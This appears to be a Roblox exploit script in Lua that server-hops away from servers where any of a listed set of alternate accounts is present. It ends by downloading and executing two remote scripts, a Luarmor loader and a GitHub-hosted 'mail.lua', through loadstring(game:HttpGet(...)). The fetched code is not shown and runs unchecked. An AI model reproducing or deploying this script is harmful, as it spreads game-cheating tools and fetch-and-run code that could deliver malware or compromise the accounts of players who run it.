repeat
    task.wait()
until game:IsLoaded()

-- Constants and Services
local instance_id = 18901165922
local plrs = game:GetService("Players")
local plr = plrs.LocalPlayer
local tpService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

-- List of Alternate Accounts
local alts = {
        "TurkGrogu", "EncardGo513", "EncardGo113", "EncardGo139", "EncardGo459", "EncardGo275",
        "Mami_Pet1", "Mami_Pet2", "Mami_Pet3", "Mami_Pet4", "Mami_Pet5",
        "Mami_Pet6", "Mami_Pet7"
}

-- Get Server List Function
local function getServers()
    local url = string.format(
        "https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", 
        instance_id
    )
    local success, response
    repeat
        success, response = pcall(function()
            return HttpService:JSONDecode(game:HttpGet(url)).data
        end)
        if not success then
            warn("Failed to retrieve servers. Retrying...")
            task.wait(2)
        end
    until success
    return response
end

-- Server Hop Function
local function serverhop()
    local server
    repeat
        task.wait(1)
        server = getServers()[Random.new():NextInteger(1, 100)]
    until server and server.id ~= game.JobId
    tpService:TeleportToPlaceInstance(instance_id, server.id, plr)
end

-- Server Hop If Alt Detected
local function checkForAlts()
    for _, player in ipairs(plrs:GetPlayers()) do
        if table.find(alts, player.Name) and player.Name ~= plr.Name then
            serverhop()
            break
        end
    end
end

-- Initial Alt Check
checkForAlts()

-- Check for Alts on Player Joining
plrs.PlayerAdded:Connect(function(player)
    if table.find(alts, player.Name) and player.Name ~= plr.Name then
        serverhop()
    end
end)

-- Load external scripts
pcall(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/957ebb42504c2c23a15c8e78a4758f38.lua"))()
end)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/mail.lua"))()
end)


